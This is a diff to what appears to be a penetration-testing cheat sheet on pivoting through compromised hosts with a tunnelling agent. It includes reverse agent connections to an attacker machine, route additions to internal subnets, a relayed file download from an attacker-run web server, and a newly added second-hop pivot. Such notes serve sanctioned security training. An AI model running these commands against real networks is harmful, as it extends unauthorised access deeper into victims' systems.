@@ -115,7 +115,7 @@ agent1: agent.exe -connect kali_ip:11601 -ignore-cert
 kali: session
 kali: 1
 kali: ifconfig
-kali: sudo ip route add 172.16.0.0/16(second interface) dev ligolo
+kali: sudo ip route add 172.16.5.0/24(second interface) dev ligolo
 kali: session;1
 kali: start
 kali: listener_list
@@ -125,8 +125,11 @@ kali: listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:80(file transfer)
 attacker_host: python3 -m http.server 80
 172.16.5.35: curl http://172.16.5.15:1235/file -o file
 
+Second Hop:
 attacker_host: listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:11601
 Agent2: agent.exe -connect 172.16.5.15:4444 -ignore-cert
+attacker_host: session;2
+attacker_host: start --tun internal2  (now u can ping 172.16.6.35)
 ```
 ### Windows Port forwarding
 ###### PLINK.exe
